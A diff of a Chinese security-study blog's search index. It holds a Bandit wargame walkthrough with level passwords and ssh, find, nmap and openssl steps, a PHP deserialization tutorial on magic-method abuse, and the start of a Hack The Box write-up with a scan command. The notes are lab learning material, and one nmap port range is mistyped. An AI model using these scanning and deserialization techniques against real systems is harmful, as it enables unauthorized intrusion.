-<p>需要用到ls -a命令查看隐藏</p>
-<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230513214557871.png" alt="image-20230513214557871"></p>
-<p>2EW7BBsr6aMMoJ2HjW067dm8EgX26xNe</p>
-<h2 id="level-5"><a href="#level-5" class="headerlink" title="level 5"></a>level 5</h2><p>在inhere目录下，只有一个唯一可读的文件</p>
-<p>由于文件名都有规律，且有特殊符号，于是我用了 cat .&#x2F;-file0{0,1,2…9}的方法，也就是在末尾3个之间，再cat .&#x2F;-file07试试，有了</p>
-<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230513221122380.png" alt="image-20230513221122380"></p>
-<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230513221420135.png" alt="image-20230513221420135"></p>
-<p>lrIWWI6bB37kxfiCQZqUdOIYfr6eEeqR</p>
-<p>正解操作是：</p>
-<p>file .&#x2F;-file* 查看文件类型</p>
-<p>cat .&#x2F;-file07</p>
-<h2 id="level-6"><a href="#level-6" class="headerlink" title="level 6"></a>level 6</h2><p>密码存储文件在inhere目录下，且可读、1033bytes、不可执行</p>
-<p>inhere目录下有将近20个目录，一个个来不太现实，用到du命令</p>
-<p>du : 显示每个文件和目录的磁盘使用空间~~~文件的大小。</p>
-<p>命令参数：</p>
-<p>-a   #显示目录中文件的大小  单位 KB 。</p>
-<p>-b  #显示目录中文件的大小，以字节byte为单位。</p>
-<p>-c  #显示目录中文件的大小，同时也显示总和；单位KB。</p>
-<p>-k 、 -m  #显示目录中文件的大小，-k 单位KB，-m 单位MB.</p>
-<p>-s  #仅显示目录的总值，单位KB。</p>
-<p>-h  #以K  M  G为单位显示，提高可读性~~~（最常用的一个~也可能只用这一个就满足需求了）<br><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230513223236240.png" alt="image-20230513223236240"></p>
-<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230513223206962.png" alt="image-20230513223206962"></p>
-<p>du -a -b</p>
-<p>cat .&#x2F;maybehere07&#x2F;.file2</p>
-<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230513223351281.png" alt="image-20230513223351281"></p>
-<p>P4L4vucdmLnm8I7Vl7jG1ApGSfjYKqJU</p>
-<h2 id="level-7"><a href="#level-7" class="headerlink" title="level 7"></a>level 7</h2><p>被存在服务器的某处，由用户bandit7所有，bandit6组所有，33bytes</p>
-<p>find基本用法：find [PATH] [option] [action]  </p>
-<p>-user name : 列出文件所有者为name的文件<br>        -group name : 列出文件所属用户组为name的文件<br>        -uid n : 列出文件所有者为用户ID为n的文件<br>        -gid n : 列出文件所属用户组为用户组ID为n的文件  </p>
-<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230514112457648.png" alt="image-20230514112457648"></p>
-<p>可以使用 <strong>2&gt;&#x2F;dev&#x2F;null</strong> 将错误信息重定向</p>
-<p><code>find / -user bandit7 -group bandit6 -size 33c 2&gt;/dev/null</code></p>
-<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230514112752119.png" alt="image-20230514112752119"></p>
-<p>参考<a href="https://www.jianshu.com/p/bf8cc6b0efd1">【bandit】WarGame之bandit通关日志 - 简书 (jianshu.com)</a></p>
-<h2 id="level-8"><a href="#level-8" class="headerlink" title="level 8"></a>level 8</h2><p>在data.txt文件中内容为<strong>millionth</strong>的那一行中</p>
-<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230514114655477.png" alt="image-20230514114655477"></p>
-<p>TESKZC0XvTetK0S9xNwm25STk5iWrBvP</p>
-<h2 id="level-9"><a href="#level-9" class="headerlink" title="level 9"></a>level 9</h2><p>在data.txt中，仅出现一次的行文本中</p>
-<p>sort与uniq命令</p>
-<p>sort排序，</p>
-<p>uniq是去掉相邻的重复行，-c统计次数，-u显示不重复的行</p>
-<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230514115858357.png" alt="image-20230514115858357"></p>
-<p>-c找出现次数为1的即可</p>
-<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230514115916436.png" alt="image-20230514115916436"></p>
-<p>参考：<a href="https://www.jianshu.com/p/bf8cc6b0efd1">【bandit】WarGame之bandit通关日志 - 简书 (jianshu.com)</a></p>
-<h2 id="level-10"><a href="#level-10" class="headerlink" title="level 10"></a>level 10</h2><p>在data.txt文件中的少数几个人类可读的字符串中，前面有几个&#x3D;符号</p>
-<p>一般查看有乱码</p>
-<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230514121138624.png" alt="image-20230514121138624"></p>
-<p><code>用strings data.txt</code></p>
-<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230514121241304.png" alt="image-20230514121241304"></p>
-<h2 id="level-11"><a href="#level-11" class="headerlink" title="level 11"></a>level 11</h2><p>data.txt文件中，但是包含base64编码</p>
-<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230514121610805.png" alt="image-20230514121610805"></p>
-<h2 id="level-12"><a href="#level-12" class="headerlink" title="level 12"></a>level 12</h2><p>data.txt文件中，但是rot13加密</p>
-<p>tr命令：对输入字符进行替换、压缩和删除</p>
-<p>将所有的字符向后移动13位,但要保持大写和小写</p>
-<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230514122106548.png" alt="image-20230514122106548"></p>
-<p>参考：[使用ROT13加密解密_tr解rot13_apersonlikep的博客-CSDN博客](<a href="https://blog.csdn.net/apersonlikep/article/details/89332063?ops_request_misc=%7B%22request_id%22:%22168403789316800182732613%22,%22scm%22:%2220140713.130102334..%22%7D&request_id=168403789316800182732613&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-1-89332063-null-null.142%5Ev87%5Econtrol_2,239%5Ev2%5Einsert_chatgpt&utm_term=linux">https://blog.csdn.net/apersonlikep/article/details/89332063?ops_request_misc=%7B%22request%5Fid%22%3A%22168403789316800182732613%22%2C%22scm%22%3A%2220140713.130102334..%22%7D&amp;request_id=168403789316800182732613&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-1-89332063-null-null.142^v87^control_2,239^v2^insert_chatgpt&amp;utm_term=linux</a> rot13&amp;spm&#x3D;1018.2226.3001.4187)</p>
-<h2 id="level-13"><a href="#level-13" class="headerlink" title="level 13"></a>level 13</h2><p>是data.txt文件，但是反复压缩，十六进制转储。</p>
-<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230514122659959.png" alt="image-20230514122659959"></p>
-<p>xxd命令：转二级制、十六进制</p>
-<p>mv命令：重命名</p>
-<p>gzip&#x2F;bzip2 -d&#x2F;tar -xvf命令：解压缩</p>
-<p>先转二级制</p>
-<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230514123813942.png" alt="image-20230514123813942"></p>
-<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230514123825354.png" alt="image-20230514123825354"></p>
-<p>重命名gz、解压</p>
-<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230514123946806.png" alt="image-20230514123946806"></p>
-<p>重命名bz2、解压</p>
-<p><img src="/image-20230514124152671.png" alt="image-20230514124152671"></p>
-<p>重命名gz、解压</p>
-<p><img src="/image-20230514124254797.png" alt="image-20230514124254797"></p>
-<p>重命名tar、解压</p>
-<p><img src="/image-20230514124423926.png" alt="image-20230514124423926"></p>
-<p><img src="/image-20230514124556058.png" alt="image-20230514124556058"></p>
-<p>重命名bz2，解压</p>
-<p><img src="/image-20230514124733776.png" alt="image-20230514124733776"></p>
-<p>重命名tar、解压</p>
-<p><img src="/image-20230514124850246.png" alt="image-20230514124850246"></p>
-<p>重命名gz、解压</p>
-<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230514124956549.png" alt="image-20230514124956549"></p>
-<h2 id="ssh、telnet、nc、openssl、nmap工具篇"><a href="#ssh、telnet、nc、openssl、nmap工具篇" class="headerlink" title="ssh、telnet、nc、openssl、nmap工具篇"></a>ssh、telnet、nc、openssl、nmap工具篇</h2><h2 id="level-14"><a href="#level-14" class="headerlink" title="level 14"></a>level 14</h2><p>在**&#x2F;etc&#x2F;bandit_pass&#x2F;bandit14**中，且只能由bandit14用户读取。且提供了一个私有SSH密钥。</p>
-<!--ssh -i 秘钥文件名称 root@远程IP地址-->
-
-<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230514130400052.png" alt="image-20230514130400052"></p>
-<p>报错了，看不懂，但是看到绿字说22端口登录是不支持的，于是换个端口。</p>
-<p>加了个-p 2220，虽然也报错，但还是提示连到了</p>
-<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230514132248403.png" alt="image-20230514132248403"></p>
-<p>查看即可</p>
-<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230514132359501.png" alt="image-20230514132359501"></p>
-<p>fGrHPx402xGC7U7rXKDaxiWFTOiF0ENq</p>
-<h2 id="level-15"><a href="#level-15" class="headerlink" title="level 15"></a>level 15</h2><p>连接到本机，且端口为30000提交密码</p>
-<p>telnet ip地址 端口</p>
-<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230514133034901.png" alt="image-20230514133034901"></p>
-<p>jN2kgmIXJ6fShzhT2avhotn4Zcka6tnt</p>
-<h2 id="level-16"><a href="#level-16" class="headerlink" title="level 16"></a>level 16</h2><p>在localhost，端口为30001处提交上关密码，且有ssl加密</p>
-<p>openssl：多用途、跨平台密码工具</p>
-<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230514133923601.png" alt="image-20230514133923601"></p>
-<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230514133934323.png" alt="image-20230514133934323"></p>
-<p>JQttfApK4SeyHwDlI9SXGR50qclOAil1</p>
-<h2 id="level-17"><a href="#level-17" class="headerlink" title="level 17"></a>level 17</h2><p>目的是获取证书，将上一级的密码发送至端口范围为31000到32000的localhost上。1.找出有哪些端口是服务器监听着的；2.找出哪些是使用SSL的；3.只有一个服务器是会给你下一级证书的，其它的只会重复你发给它的。</p>
-<p>知识点：端口扫描</p>
-<p><code>nmap localhost -p310000-320000</code></p>
-<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230515113201632.png" alt="image-20230515113201632"></p>
-<p><code>openssl s_client -connect localhost:port</code>对上述端口依次尝试，并提交密码</p>
-<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230515114635689.png" alt="image-20230515114635689"></p>
-<p>port为31790时</p>
-<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230515114912840.png" alt="image-20230515114912840"></p>
-<p>可以知道，又是私钥登陆，与ssh -i有关</p>
-<p>存放该私钥。</p>
-<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230515120130800.png" alt="image-20230515120130800"></p>
-<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230515120139520.png" alt="image-20230515120139520"></p>
-<p><code>ssh -i /tmp/my111/key bandit17@localhost -p2220</code></p>
-<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230515120357068.png" alt="image-20230515120357068"></p>
-<p>要设定权限，700，即只有拥有者可以读写。</p>
-<p><code>chmod 700 /tmp/my111/key</code></p>
-<p><img src="/../../../Typora/img111/image-20230515120619059.png" alt="image-20230515120619059"></p>
-<p>成功登入。</p>
-<h2 id="level-17-gt-18"><a href="#level-17-gt-18" class="headerlink" title="level 17-&gt;18"></a>level 17-&gt;18</h2><p>在主目录有两文件<strong>passwords.old and passwords.new</strong>. </p>
-<p>下一级的密码在 <strong>passwords.new</strong>里，并且这个old和new只有一行改动了的。</p>
-<p>​		注意：当登入bandit18时看到”Byebye!”，这和bandit19有关。</p>
-<p>diff命令，比较文件不同。</p>
-<ul>
-<li><p>“|”表示前后2个文件内容有不同</p>
-</li>
-<li><p>“&lt;”表示后面文件比前面文件少了1行内容</p>
-</li>
-<li><p>“&gt;”表示后面文件比前面文件多了1行内容</p>
-<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230515130247402.png" alt="image-20230515130247402"></p>
-</li>
-</ul>
-<p>hga5tuuCLF6fFzUpnagiMN8ssu9LFrdg</p>
-<p>exit -&gt;r</p>
-<p>登入bandit18，输入密码出现：<img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230515130727349.png" alt="image-20230515130727349"></p>
-<h2 id="level-18-gt-19"><a href="#level-18-gt-19" class="headerlink" title="level 18-&gt;19"></a>level 18-&gt;19</h2><p>下一级密码在主目录的readme中，但是嘞，有人修改了.bashrc，使得在使用SSH登录时注销。</p>
-<p>考察点：ssh登陆后可以跟命令执行</p>
-<p>所以在bandit17时采用远程登录。</p>
-<p><code>ssh bandit18@localhost -p2220</code></p>
-<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230515133004926.png" alt="image-20230515133004926"></p>
-<p>上图中，rm和chmod也是不允许的操作，查找其他博主的wp，在后面加了“cat  readme”但没效果</p>
-<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230515145336983-1684133695637-1.png"></p>
-<p>止步于此，没权限，不搞了。</p>
-]]></content>
-      <categories>
-        <category>linux</category>
-      </categories>
-      <tags>
-        <tag>linux</tag>
-        <tag>ssh</tag>
-        <tag>bandit</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>bp工具</title>
     <url>/2023/05/13/bp%E4%BD%BF%E7%94%A8/</url>
     <content><![CDATA[<p>抓包；爆破；repeat尝试；ssrf表单伪造；编码解码</p>
@@ -473,6 +473,211 @@ return $outText;#新值
       </categories>
       <tags>
         <tag>bp工具</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>php反序列化</title>
+    <url>/2023/05/29/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
+    <content><![CDATA[<h1 id="1-参考文章"><a href="#1-参考文章" class="headerlink" title="1.参考文章"></a>1.参考文章</h1><p><a href="https://xz.aliyun.com/t/12507">php反序列化完整总结 - 先知社区 (aliyun.com)</a></p>
+<p><a href="https://spaceman-911.gitee.io/2021/06/30/PHP-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%EF%BC%88%E8%B6%85%E7%BB%86%E7%9A%84%EF%BC%89/">PHP-反序列化（超细的） | spaceman’blog (gitee.io)</a></p>
+<h1 id="2-反序列化"><a href="#2-反序列化" class="headerlink" title="2.反序列化"></a>2.反序列化</h1><p>php中，序列化函数serialize()，反序列化函数unserialize()。</p>
+<p>序列化：将对象序列化为一串字符串；</p>
+<p>反序列化相反。</p>
+<p>并非只对类可以序列化，数组也可以的。</p>
+<h2 id="序列化演示："><a href="#序列化演示：" class="headerlink" title="序列化演示："></a>序列化演示：</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"> <span class="class"><span class="keyword">class</span> <span class="title">classAAA</span></span></span><br><span class="line"><span class="class"> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>=<span class="string">&quot;yuleiyun&quot;</span>;</span><br><span class="line">	 <span class="keyword">protected</span> <span class="variable">$b</span>=<span class="string">&quot;yunque&quot;</span>;</span><br><span class="line">	 <span class="keyword">private</span> <span class="variable">$c</span>=<span class="string">&quot;haha&quot;</span>;</span><br><span class="line">	 <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">test</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">	 </span>&#123;</span><br><span class="line">		 <span class="keyword">echo</span> <span class="string">&quot;test,ok&quot;</span>;</span><br><span class="line">	 &#125;</span><br><span class="line"> &#125;</span><br><span class="line"><span class="variable">$test</span>=<span class="keyword">new</span> <span class="title function_ invoke__">classAAA</span>();</span><br><span class="line"><span class="variable">$test1</span>=<span class="title function_ invoke__">serialize</span>(<span class="variable">$test</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$test1</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>结果为：</p>
+<blockquote>
+<p>O:8:”classAAA”:3:{s:1:”a”;s:8:”yuleiyun”;s:4:”*b”;s:6:”yunque”;s:11:”classAAAc”;s:4:”haha”;}</p>
+</blockquote>
+<p>对以上结构分析得：</p>
+<blockquote>
+<p><em>O:对象名的长度:”对象名”:对象属性个数:{s:属性名的长度:”属性名”;s:属性值的长度:”属性值”;}</em></p>
+</blockquote>
+<p>a是public类型的变量，s表示字符串，8表示变量名的长度，a是变量名。</p>
+<p>b是protected类型的变量，它的变量名长度为4，protected属性的表示方式是在变量名前加上%00*%00，这个长度就是3了，%00很熟悉了，ASCII码即为0。</p>
+<p>c是private类型的变量，c的变量名前添加了%00类名%00。所以，private属性的表示方式是在变量名前加上%00类名%00。</p>
+<p>而且可见，序列化字符串中<strong>只保存变量</strong>，不保存函数方法。</p>
+<h2 id="反序列化演示"><a href="#反序列化演示" class="headerlink" title="反序列化演示"></a>反序列化演示</h2><blockquote>
+<p>在php下:</p>
+<p>echo 输出的是变量和字符串;</p>
+<p>var_dump 输出的是变量类型,变量长度和变量值;打印数组及其结构</p>
+</blockquote>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"> <span class="class"><span class="keyword">class</span> <span class="title">classAAA</span></span></span><br><span class="line"><span class="class"> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>=<span class="string">&quot;yuleiyun&quot;</span>;</span><br><span class="line">	 <span class="keyword">protected</span> <span class="variable">$b</span>=<span class="string">&quot;yunque&quot;</span>;</span><br><span class="line">	 <span class="keyword">private</span> <span class="variable">$c</span>=<span class="string">&quot;haha&quot;</span>;</span><br><span class="line">	 <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">test</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">	 </span>&#123;</span><br><span class="line">		 <span class="keyword">echo</span> <span class="string">&quot;test,ok&quot;</span>;</span><br><span class="line">	 &#125;</span><br><span class="line"> &#125;</span><br><span class="line"><span class="variable">$test</span>=<span class="keyword">new</span> <span class="title function_ invoke__">classAAA</span>();</span><br><span class="line"><span class="variable">$test1</span>=<span class="title function_ invoke__">serialize</span>(<span class="variable">$test</span>);</span><br><span class="line"><span class="variable">$test2</span>=<span class="title function_ invoke__">unserialize</span>(<span class="variable">$test1</span>);</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$test2</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>结果为：</p>
+<blockquote>
+<p>object(classAAA)#2 (3) {<br> [“a”]&#x3D;&gt;<br> string(8) “yuleiyun”<br> [“b”:protected]&#x3D;&gt;<br> string(6) “yunque”<br> [“c”:”classAAA”:private]&#x3D;&gt;<br> string(4) “haha”<br>}</p>
+</blockquote>
+<p>除此之外。var_dump与 echo具体输出的话，<strong>只能指向公共变量a</strong>，</p>
+<p>如var_dump($test2-&gt;a);</p>
+<p>否则出现:</p>
+<blockquote>
+<p>Fatal error: Uncaught Error: Cannot access protected property </p>
+</blockquote>
+<h1 id="3-漏洞产生原理"><a href="#3-漏洞产生原理" class="headerlink" title="3.漏洞产生原理"></a>3.漏洞产生原理</h1><p>与魔术方法有关，魔术方法接收了序列化后未经过滤的字符串，不当执行造成的。比如魔术方法有一些检查，你可以构造一些数据绕过这些检查，那这样未过滤的输入，危害性很大咯。</p>
+<h2 id="魔术方法"><a href="#魔术方法" class="headerlink" title="魔术方法"></a>魔术方法</h2><blockquote>
+<p>魔术方法命名是以符号<strong>开头的，比如</strong> construct, <strong>destruct,</strong> toString, <strong>sleep,</strong> wakeup等等。这些函数在某些情况下会自动调用。</p>
+<ul>
+<li>__construct():具有构造函数的类会在每次创建新对象时先调用此方法。</li>
+<li>__destruct():析构函数会在到某个对象的所有引用都被删除或者当对象被显式销毁时执行。</li>
+<li>__toString()方法用于一个类被当成字符串时应怎样回应。例如echo $obj;应该显示些什么。 <strong>此方法必须返回一个字符串</strong>，否则将发出一条 E_RECOVERABLE_ERROR 级别的致命错误。</li>
+<li>__sleep()方法在一个对象被序列化之前调用；可以指定要序列化的对象属性</li>
+<li>__wakeup():unserialize( )会检查是否存在一个_wakeup( )方法。如果存在，则会先调用_wakeup方法，预先准备对象需要的资源。</li>
+<li>get(),set() 当调用或设置一个类及其父类方法中未定义的属性时</li>
+<li>__invoke() 调用函数的方式调用一个对象时的回应方法</li>
+<li>call 和 callStatic前者是调用类不存在的方法时执行，而后者是调用类不存在的静态方式方法时执行。</li>
+<li>isset()：在不可访问的属性上调用isset()或empty()触发 </li>
+<li>unset()：在不可访问的属性上使用unset()时触发</li>
+</ul>
+</blockquote>
+<p><strong>注意：php代码，执行完最后一行代码，会自动销毁变量（可能不太准确）</strong></p>
+<h2 id="魔术方法执行顺序"><a href="#魔术方法执行顺序" class="headerlink" title="魔术方法执行顺序"></a>魔术方法执行顺序</h2><p>代码示例：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"> <span class="class"><span class="keyword">class</span> <span class="title">Test1</span></span></span><br><span class="line"><span class="class"> </span>&#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$a</span>=<span class="string">&quot;123&quot;</span>;</span><br><span class="line">	 </span><br><span class="line"></span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&quot;执行了construct&quot;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	 <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&quot;执行了destruct&quot;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__sleep</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&quot;执行了sleep&quot;</span>;</span><br><span class="line">		 <span class="keyword">return</span> <span class="keyword">array</span>();</span><br><span class="line">		  </span><br><span class="line">	&#125;</span><br><span class="line">	  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">		 <span class="keyword">return</span> <span class="string">&quot;执行了toString&quot;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&quot;执行了wakeup&quot;</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;new一个对象\n&quot;</span>;</span><br><span class="line"><span class="variable">$test</span> =<span class="keyword">new</span> <span class="title class_">Test1</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;\n直接输出类，会调用To_string\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$test</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;\n序列化，先执行sleep(若有)哈，再序列化\n&quot;</span>;</span><br><span class="line"><span class="variable">$test1</span>=<span class="title function_ invoke__">serialize</span>(<span class="variable">$test</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;\n反序列化，先执行wakeup(若有)，有则先调用wakeup\n&quot;</span>;</span><br><span class="line"><span class="variable">$test2</span>=<span class="title function_ invoke__">unserialize</span>(<span class="variable">$test1</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>结果为：</p>
+<blockquote>
+<p>new一个对象<br>执行了construct</p>
+<p>直接输出类，会调用To_string<br>执行了toString</p>
+<p>序列化，先执行sleep(若有)哈，再序列化<br>执行了sleep</p>
+<p>反序列化，先执行wakeup(若有)，有则先调用wakeup<br>执行了wakeup<br>执行了destruct执行了destruct</p>
+</blockquote>
+<p>两次destruct，销毁了反序列化对象一次，new的对象一次。</p>
+<p>注意：<strong>我这里如果不在sleep指定序列化的变量，是输出不出来的（wakeup，还有反序列的结果）</strong></p>
+<blockquote>
+<p>public function __sleep(){<br>    echo “执行了sleep”;<br>     <strong>return array();</strong><br>}</p>
+</blockquote>
+<h2 id="反序列化与构造函数"><a href="#反序列化与构造函数" class="headerlink" title="反序列化与构造函数"></a>反序列化与构造函数</h2><p>虽然反序列化返回的也是一个对象。但构造函数不会在反序列化期间被调用，而是在对象创建时（使用<code>new</code>关键字）才会被调用。反序列化过程只会还原对象的状态，而不会再次创建对象。</p>
+<h1 id="4-实例"><a href="#4-实例" class="headerlink" title="4.实例"></a>4.实例</h1><h2 id="wakeup绕过"><a href="#wakeup绕过" class="headerlink" title="wakeup绕过"></a>wakeup绕过</h2><p>见本博客的CVE部分的CVE-2016-7124</p>
+<h4 id="绕过方法"><a href="#绕过方法" class="headerlink" title="绕过方法"></a>绕过方法</h4><blockquote>
+<ol>
+<li>未定义 <code>__wakeup()</code> 方法： 如果类的定义中没有定义 <code>__wakeup()</code> 方法，无论序列化字符串中的内容如何，都不会触发 <code>__wakeup()</code> 方法的执行。</li>
+<li>类的名称不匹配： 序列化字符串中指定的类名与实际的类名不匹配，或者序列化字符串中的类不存在时，也不会触发 <code>__wakeup()</code> 方法。</li>
+<li>修改类定义： 如果在序列化和反序列化之间修改了类的定义，包括类名、属性或方法的修改，可能会导致 <code>__wakeup()</code> 方法不被调用。因为序列化和反序列化过程依赖于类的定义和结构，如果类的定义发生了改变，可能无法正确还原对象的结构，进而无法触发 <code>__wakeup()</code> 方法。</li>
+</ol>
+</blockquote>
+<h2 id="字符逃逸"><a href="#字符逃逸" class="headerlink" title="字符逃逸"></a>字符逃逸</h2><h4 id="漏洞特点"><a href="#漏洞特点" class="headerlink" title="漏洞特点"></a>漏洞特点</h4><p>1.相当于构造闭合。（已知php在反序列化时，底层代码以;作为字段分隔，以}作为结尾，且根据长度判断内容。通过构造一定范围内的….;}提前闭合，挤出后面的内容。）</p>
+<p>2.长度不对应会报错。</p>
+<h4 id="漏洞产生"><a href="#漏洞产生" class="headerlink" title="漏洞产生"></a>漏洞产生</h4><p>代码中存在针对序列化后的字符串进行了过滤操作。</p>
+<h2 id="phar反序列化"><a href="#phar反序列化" class="headerlink" title="phar反序列化"></a>phar反序列化</h2><h2 id="session反序列化"><a href="#session反序列化" class="headerlink" title="session反序列化"></a>session反序列化</h2>]]></content>
+      <categories>
+        <category>web漏洞</category>
+        <category>php反序列化</category>
+      </categories>
+      <tags>
+        <tag>漏洞</tag>
+        <tag>php反序列化</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>hack the box</title>
+    <url>/2023/05/31/hack-the-box/</url>
+    <content><![CDATA[<h1 id="简单"><a href="#简单" class="headerlink" title="简单"></a>简单</h1><h2 id="1-Busqueda"><a href="#1-Busqueda" class="headerlink" title="1.Busqueda"></a>1.Busqueda</h2><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://blog.csdn.net/m0_56308852/article/details/130168742?ops_request_misc=%7B%22request_id%22:%22168587920116782425137143%22,%22scm%22:%2220140713.130102334.pc_all.%22%7D&request_id=168587920116782425137143&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_ecpm_v1~hot_rank-5-130168742-null-null.142%5Ev88%5Econtrol_2,239%5Ev2%5Einsert_chatgpt&utm_term=Busqueda&spm=1018.2226.3001.4187">htb busqueda wp要点记录_春猿火的博客-CSDN博客</a></p>
+<p><a href="https://blog.csdn.net/qq_58869808/article/details/130050438?ops_request_misc=%7B%22request_id%22:%22168587920116782425137143%22,%22scm%22:%2220140713.130102334.pc_all.%22%7D&request_id=168587920116782425137143&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_ecpm_v1~hot_rank-1-130050438-null-null.142%5Ev88%5Econtrol_2,239%5Ev2%5Einsert_chatgpt&utm_term=Busqueda&spm=1018.2226.3001.4187">(87条消息) HTB Busqueda WriteUP_Som3B0dy的博客-CSDN博客</a></p>
+<p>ping一遍，能ping通</p>
+<p>发现端口：&#96;nmap -A  10.10.11.208 </p>
